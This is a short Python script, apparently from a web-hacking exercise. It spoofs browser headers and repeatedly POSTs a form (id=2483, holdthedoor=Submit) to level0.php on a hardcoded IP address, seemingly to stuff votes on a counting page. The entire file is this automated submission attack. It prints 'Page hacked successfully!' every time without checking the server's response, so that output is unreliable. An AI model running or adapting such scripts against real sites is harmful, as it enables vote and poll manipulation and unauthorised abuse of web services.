#!/usr/bin/python3
import requests

headers = {
    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Encoding':'gzip, deflate',
    'Accept-Language':'en-GB,en;q=0.9,fr;q=0.8,en-US;q=0.7,es;q=0.6',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Length': '26',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Host': '158.69.76.135',
    'Origin': 'http://158.69.76.135',
    'Referer': 'http://158.69.76.135/level0.php',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
}

data = {
    'id':'2483',
    'holdthedoor':'Submit'
}

URL = "http://158.69.76.135/level0.php"
for i in range(0, 3):
    page = requests.post(URL, data=data, headers=headers)
    print("Page hacked successfully!\nForm number: {}\n".format(i))
